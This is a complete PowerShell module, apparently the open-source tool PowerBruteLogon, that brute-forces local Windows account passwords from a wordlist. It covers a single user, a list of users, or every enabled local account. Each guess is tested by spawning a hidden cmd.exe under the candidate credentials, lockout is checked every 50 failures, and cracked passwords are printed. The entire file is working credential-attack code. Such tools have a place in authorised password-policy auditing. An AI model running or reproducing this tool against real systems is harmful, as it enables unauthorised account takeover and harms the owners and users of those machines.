<#-------------------------------------------------------------------------------
    .Developer
        Jean-Pierre LESUEUR (@DarkCoderSc)
        https://www.twitter.com/darkcodersc
        https://github.com/DarkCoderSc
        www.phrozen.io
        jplesueur@phrozen.io
        PHROZEN
    .License
        Apache License
        Version 2.0, January 2004
        http://www.apache.org/licenses/
-------------------------------------------------------------------------------#>    


# Returns
# 1: Logon Success
# 2: Logon Failed
# 3: Account Locked
function Invoke-UserLogon     
{
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password,
        [bool]$CheckIfAccountLocked=$false
    )

    try 
    {
        $protectedPassword = ConvertTo-SecureString $Password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential $Username, $protectedPassword
        
        # Start a hidden command line prompt
        # I'm using "cmd.exe" with parameter "/c" to make the new command prompt disapear immediately after spawn
        # We can't use "Stop-Process" cmdlet with "-PassThru" since the process is started as another user thus resulting in "Access Denied(5)" error.
        $proc = Start-Process -FilePath "System32\cmd.exe" -Credential $credential -WorkingDirectory $env:WINDIR -WindowStyle hidden -ArgumentList "/c"

        return 1     
    }
    catch
    {
        # This check is alone to avoid inspecting string for locked out string and consuming precious time
        if ($CheckIfAccountLocked)
        {
            if ($_.Exception.Message -like "*is currently locked out*")
            {
                #throw [string]::Format("User account {0} is locked. A lockout policy seems to be implemented and preventing ""PowerBruteLogon"" to work.", $Username)
                return 3
            }
        }
        return 2
    }
}

function Find-FilePath
{
    param (
        [Parameter(Mandatory=$true)]
        [string]$FileName
    )

    try
    {
        return (Test-Path -Path $FileName -PathType Leaf)
    } 
    catch
    {
        return $false
    }
}

function Find-WindowsUser
{
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username
    )

    $userObject = (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)

    if ($null -eq $userObject)
    {
        $result = $false
    }
    else
    {
        $result = $userObject.Enabled
    }

    return $result
}

function Export-ColoredPassword
{
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )

    Write-Host ([string]::Format("Password found, ""{0}:", $Username)) -NoNewLine
    Write-Host $Password -NoNewLine -ForegroundColor Green
    Write-Host """"
}

function Invoke-BruteLogon
{
    <#
        Mode:
            - 1: Single user brute force.
            - 2: Multiple user brute force (WordList).
            - 3: Brute force all available local accounts.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [int]$Mode,         
        [Parameter(Mandatory=$true)]
        [string]$WordList,
        [string]$Username = "",
        [string]$UserList = "",
        [string[]]$IgnoreUsers = @()

    )

    # Check WordList file existance
    if (-not (Find-FilePath -fileName $WordList))
    {
        throw [string]::Format("Filename ""{0}"" does not exists.", $WordList)
    }

    [System.Collections.ArrayList] $targetUsers = @()

    # Prepare Recipe
    switch ($Mode)
    {
        # Single User
        1 {
            if (-not $Username)
            {
                throw "Username function parameter must be set when mode=1"
            }

            # Check if targeted windows user exists
            if (-not (Find-WindowsUser -Username $Username))
            {
                throw [string]::Format("User ""{0}"" does not exists or is disabled on local machine.", $Username)
            }

            $targetUsers.Add($Username) | Out-Null
        }

        # User list
        2 {
            if (-not $UserList)
            {
                throw "UserList function parameter must be set when mode=2"
            }

            # Check UserList file existance
            if (-not (Find-FilePath -FileName $UserList))
            {
                throw [string]::Format("Filename ""{0}"" does not exists.", $UserList)
            }

            Write-Host "Prepare the list of users..."

            $reader = New-Object -TypeName System.IO.StreamReader -ArgumentList $UserList
            try
            {      
                while ($null -ne ($line = $reader.ReadLine()))
                {       
                    $user = $line.Trim()

                    if (Find-WindowsUser -Username $user)
                    {
                        $targetUsers.Add($user) | Out-Null
                    }   
                    else
                    {
                        Write-Host ([string]::Format("User ""{0}"" does not exists or is disabled on local machine, skipping user...", $user))
                    }
                }
            }
            finally
            {
                $reader.Close();
                $reader.Dispose();   
            }
        }

        # Available local accounts
        3 {
            # Build UserList
            foreach ($userObject in Get-LocalUser)
            {

                if ($IgnoreUsers -contains $userObject.Name)
                {
                    Write-Host ([string]::Format("Ignore {0} user.", $userObject.Name))

                    continue
                }

                if ($userObject.Enabled)
                {
                    $targetUsers.Add($userObject.Name) | Out-Null
                }
            }            
        }

        default {
            throw [string]::Format("Invalid mode {0}. Available modes: ""1:Single User, 2:User List, 3:Available Local Accounts""", $Mode)
        }
    }    

    if ($targetUsers.Count -eq 0)
    {
        throw "No user to brute force. Aborting..."
    }    
    
    $reader = New-Object -TypeName System.IO.StreamReader -ArgumentList $WordList
    try
    {
        $candidateCount = (Get-Content -Path $WordList | Measure-Object -Line).Lines

        # Brutus !
        Write-Host ([string]::Format("Start bruteforcing {0} user account(s)...", $targetUsers.Count))
    
        [System.Collections.ArrayList] $foundUsers = @()

        foreach ($targetUser in $targetUsers) 
        {                
            $failedAttempts = 0            
            $currPos = 0
            try
            {
                while ($null -ne ($candidate = $reader.ReadLine()))
                {
                    $currPos++                

                    # To avoid consuming to much time in string inspection, we check if account is locked out after "n" failed attempts.
                    $checkIfAccountLocked = $false                
                    if ($failedAttempts -ge 50)
                    {
                        $failedAttempts = 0

                        $checkIfAccountLocked = $true
                    }

                    # Attempt Logon
                    $logonStatus = (Invoke-UserLogon -Username $targetUser -Password $candidate -CheckIfAccountLocked $checkIfAccountLocked)

                    $doBreak = $false
                    switch($logonStatus) 
                    {
                        # Logon Success
                        1 {
                            Export-ColoredPassword -username $targetUser -password $candidate     
                            
                            $foundUsers.Add($targetUser) | Out-Null                            

                            $doBreak = $true
                        }

                        # Logon Failed
                        2 {
                            $failedAttempts++        
                        }

                        # Account Locked
                        3 {
                            Write-Host ([string]::Format("Account {0} was locked because of to many failed attempts. Congratulation, you are protected!", $targetUser)) -ForegroundColor Yellow                    

                            $doBreak = $true
                        }
                    }            

                    if ($doBreak)
                    {
                        break
                    }

                    # Display Progress / Stats
                    $perc = [math]::Round((100 * $currPos) / $candidateCount)
                    $activity = [string]::Format("Testing candidate ""{0}"" for username ""{1}""", $candidate, $targetUser)
                    $status = [string]::Format("$perc% Complete:{0}/{1}", $currPos, $candidateCount)

                    Write-Progress -Activity $activity -Status $status -PercentComplete $perc                
                }
            }
            finally
            {
                # Reset Stream Reader
                $reader.BaseStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
                $reader.DiscardBufferedData();            
            }
        }
    }
    finally
    {
        if ($reader)
        {
            $reader.Close();
            $reader.Dispose();
        }

        # Display failed cracked accounts
        foreach ($targetUser in $targetUsers)
        {
            if (-not ($foundUsers -contains $targetUser))
            {
                Write-Host ([string]::Format("Could not crack {0} account password.", $targetUser)) -ForegroundColor Red
            }            
        }        
    }     
}

# Alias Mode = 1
function Invoke-BruteLogonAccount
{
    param (
        [Parameter(Mandatory=$true)]
        [string] $Username,
        [Parameter(Mandatory=$true)]
        [string] $WordList
    )

    Invoke-BruteLogon -Mode 1 -Username $Username -WordList $WordList
}

# Alias Mode = 2
function Invoke-BruteLogonList
{
    param (
        [Parameter(Mandatory=$true)]
        [string] $UserList,
        [Parameter(Mandatory=$true)]
        [string] $WordList
    )

    Invoke-BruteLogon -Mode 2 -UserList $UserList -WordList $WordList
}

# Alias Mode = 3
function Invoke-BruteAvailableLogons
{
    param (        
        [string[]] $IgnoreUsers = @(),
        [Parameter(Mandatory=$true)]
        [string] $WordList
    )


    Invoke-BruteLogon -Mode 3 -IgnoreUsers $IgnoreUsers -WordList $WordList
}

try {    
    Export-ModuleMember -Function Invoke-BruteLogonAccount
    Export-ModuleMember -Function Invoke-BruteLogonList
    Export-ModuleMember -Function Invoke-BruteAvailableLogons
} catch {}